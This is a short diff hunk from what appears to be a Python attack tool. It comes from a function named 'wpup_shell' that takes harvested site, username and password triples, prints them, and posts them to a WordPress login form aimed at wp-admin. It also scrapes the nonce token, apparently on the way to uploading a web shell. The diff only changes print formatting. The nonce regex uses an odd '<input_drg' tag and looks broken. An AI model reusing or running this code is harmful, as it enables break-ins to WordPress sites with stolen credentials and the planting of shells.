@@ -831,9 +831,9 @@ def wpup_shell():
                             domain = 'http'+dataLogin[0][0]
                             user = dataLogin[0][1]
                             password = dataLogin[0][2]
-                            print("{}{} [*] Site : ".format(fc, sb)+domain+"/")
-                            print(" [*] Username : ".format(fy, sb)+user)
-                            print(" [*] Password : ".format(fm, sb)+password)
+                            print(" [*] Site : "+domain+"/")
+                            print(" [*] Username : "+user)
+                            print(" [*] Password : "+password)
                             pattern = re.compile('<input_drg type="hidden" id="_wpnonce" name="_wpnonce" value="(.*)" /><input_drg type="hidden" name="_wp_http_referer"')
                             post = {'log':user,'pwd':password,'wp-submit':'Log In','redirect_to':domain+'/wp-admin/','testcookie':'1' }
                             try :
